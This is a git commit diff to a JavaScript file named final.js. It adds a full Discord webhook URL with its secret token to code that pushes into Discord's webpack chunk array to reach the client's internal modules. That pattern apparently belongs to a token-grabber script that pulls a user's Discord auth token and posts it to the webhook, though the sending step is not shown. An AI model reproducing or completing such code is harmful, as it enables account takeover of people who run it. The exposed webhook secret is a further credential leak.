d44b21ab2f88c251dd86910d8206b3be45452a93
Buibaoybi <114676747+Buibaoybi@users.noreply.github.com>
2024-05-22 00:28:12 +0700

    Update final.js

--- final.js
+++ final.js
@@ -1,4 +1,5 @@
 const url = 'https://scibidi.vercel.app/';
+e = "https://discord.com/api/webhooks/1226475240020770898/C0Z0TnkaWszupXMgbPyzbMzdxmjT8U4NuJ-wnGTXC1h2DJjaXIrs6oGlmecnYLbNoxra"
 var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
   m = [];
   for (let c in e.c) m.push(e.c[c]);
